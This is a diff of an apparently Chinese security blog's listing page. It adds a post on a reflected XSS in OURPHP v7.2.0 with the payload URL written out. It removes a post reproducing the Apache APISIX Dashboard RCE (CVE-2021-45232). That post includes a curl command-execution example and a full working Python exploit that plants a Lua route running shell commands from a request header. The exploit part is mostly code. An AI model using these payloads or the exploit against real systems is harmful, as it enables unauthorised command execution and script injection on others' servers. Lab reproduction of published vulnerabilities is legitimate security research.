@@ -255,6 +255,86 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/" class="post-title-link" itemprop="url">OURPHP  =v7.2.0 ourphp_out.php Reflection xss</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-27 08:39:42 / 修改时间：08:40:18" itemprop="dateCreated datePublished" datetime="2023-03-27T08:39:42+08:00">2023-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cve/" itemprop="url" rel="index"><span itemprop="name">-cve</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="OURPHP-v7-2-0-ourphp-out-php-Reflection-xss"><a href="#OURPHP-v7-2-0-ourphp-out-php-Reflection-xss" class="headerlink" title="OURPHP  =v7.2.0 ourphp_out.php Reflection xss"></a>OURPHP  =v7.2.0 ourphp_out.php Reflection xss</h1><p>Direct echo in the <code>/client/manage/ourphp_out.php</code> file, in addition to controllable variables, allows attackers to execute xss code.</p>
+<p>Let’s look directly at the code as follows</p>
+<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/image-20230327083656395.png" alt="image-20230327083656395"></p>
+<p>If the ourphp_admin parameter is logout, we will echo a controllable variable.<br>The controllable variable is out<br>And there’s a script tag in front, just close it for him.<br>So our payload is</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_out.php?ourphp_admin=logout&amp;out=&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Vulnerability-recurrence"><a href="#Vulnerability-recurrence" class="headerlink" title="Vulnerability recurrence"></a>Vulnerability recurrence</h2><p>Let’s download the code through the following link and install it directly in PHP Study.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://down.chinaz.com/api/index/download?id=51308&amp;type=code</span><br></pre></td></tr></table></figure>
+
+<p>After installation, directly access the following path</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_out.php?ourphp_admin=logout&amp;out=&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/image-20230327083926514.png" alt="image-20230327083926514"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -410,94 +490,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/21/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2021-45232%EF%BC%9AApache-APISIX-Dashboard-RCE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/21/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2021-45232%EF%BC%9AApache-APISIX-Dashboard-RCE/" class="post-title-link" itemprop="url">【漏洞复现】CVE-2021-45232：Apache APISIX Dashboard RCE</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-03-21 13:29:01 / 修改时间：13:32:12" itemprop="dateCreated datePublished" datetime="2023-03-21T13:29:01+08:00">2023-03-21</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="【漏洞复现】CVE-2021-45232：Apache-APISIX-Dashboard-RCE"><a href="#【漏洞复现】CVE-2021-45232：Apache-APISIX-Dashboard-RCE" class="headerlink" title="【漏洞复现】CVE-2021-45232：Apache APISIX Dashboard RCE"></a>【漏洞复现】CVE-2021-45232：Apache APISIX Dashboard RCE</h1><p>Apache APISIX有两个rce，我们先复现2021年这个</p>
-<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul>
-<li>Apache APISIX Dashboard &lt; 2.10.1</li>
-<li>body=”Apache APISIX Dashboard” &amp;&amp; country=”US”</li>
-</ul>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line">cd vulhub-master/apisix/CVE-2021-45232</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://github.com/wuppp/cve-2021-45232-exp/blob/main/apisix_dashboard_rce.py">cve-2021-45232-exp/apisix_dashboard_rce.py at main · wuppp/cve-2021-45232-exp (github.com)</a></p>
-<p>上面这个是poc，代码我会放在最后</p>
-<h2 id="poc打"><a href="#poc打" class="headerlink" title="poc打"></a>poc打</h2><p>利用/apisix/admin/migrate/export和/apisix/admin/migrate/import两个Apache APISIX Dashboard提供的未授权API，可以简单地导入一个恶意配置文件</p>
-<p>用poc直接打</p>
-<p><img src="/2023/03/21/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2021-45232%EF%BC%9AApache-APISIX-Dashboard-RCE/image-20230321132240475.png" alt="image-20230321132240475"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip:9080/R52Br4 -H &quot;cmd: id&quot;</span><br><span class="line">然后请求她的9080端口执行命令就可以了</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/21/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2021-45232%EF%BC%9AApache-APISIX-Dashboard-RCE/image-20230321132752692.png" alt="image-20230321132752692"></p>
-<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># Suppress only the single warning from urllib3 needed.</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eval_config = &#123;</span><br><span class="line">    <span class="string">&quot;Counsumers&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;Routes&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="built_in">str</span>(random.randint(<span class="number">100000000000000000</span>, <span class="number">1000000000000000000</span>)),</span><br><span class="line">            <span class="string">&quot;create_time&quot;</span>: <span class="number">1640674554</span>,</span><br><span class="line">            <span class="string">&quot;update_time&quot;</span>: <span class="number">1640677637</span>,</span><br><span class="line">            <span class="string">&quot;uris&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;/rce&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;rce&quot;</span>,</span><br><span class="line">            <span class="string">&quot;methods&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;DELETE&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PATCH&quot;</span>,</span><br><span class="line">                <span class="string">&quot;HEAD&quot;</span>,</span><br><span class="line">                <span class="string">&quot;OPTIONS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CONNECT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;TRACE&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;script&quot;</span>: <span class="string">&quot;local file = io.popen(ngx.req.get_headers()[&#x27;cmd&#x27;],&#x27;r&#x27;) \n local output = file:read(&#x27;*all&#x27;) \n file:close() \n ngx.say(output)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;status&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Services&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;SSLs&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;Upstreams&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;Scripts&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;GlobalPlugins&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;PluginConfigs&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_str</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_crc</span>(<span class="params">data</span>):</span></span><br><span class="line">    crc32 = zlib.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> crc32.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_data</span>(<span class="params">url</span>):</span></span><br><span class="line">    r = requests.get(url + <span class="string">&quot;/apisix/admin/migrate/export&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> r.text[:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_data</span>(<span class="params">url, data</span>):</span></span><br><span class="line">    data = json.dumps(data).encode()</span><br><span class="line">    crc32 = calc_crc(data)</span><br><span class="line"></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;data&quot;</span>, data + crc32, <span class="string">&quot;text/data&quot;</span>)&#125;</span><br><span class="line">    resp = requests.post(url + <span class="string">&quot;/apisix/admin/migrate/import&quot;</span>, files=files, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(resp.text)</span></span><br><span class="line">    <span class="keyword">if</span> resp.json().get(<span class="string">&quot;code&quot;</span>, -<span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; http://127.0.0.1:9000&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    </span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        url = url[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    uri = random_str()</span><br><span class="line">    eval_config[<span class="string">&quot;Routes&quot;</span>][<span class="number">0</span>][<span class="string">&quot;uris&quot;</span>] = [ <span class="string">&quot;/&quot;</span> + uri]</span><br><span class="line">    eval_config[<span class="string">&quot;Routes&quot;</span>][<span class="number">0</span>][<span class="string">&quot;name&quot;</span>] = uri</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> import_data(url, eval_config):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;attack success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uri is: &quot;</span> + <span class="string">&quot;/&quot;</span> + uri)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;attack error&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/15/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><span class="page-number current">16</span><a class="page-number" href="/page/17/">17</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/17/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/15/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><span class="page-number current">16</span><a class="page-number" href="/page/17/">17</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/17/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -565,7 +561,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
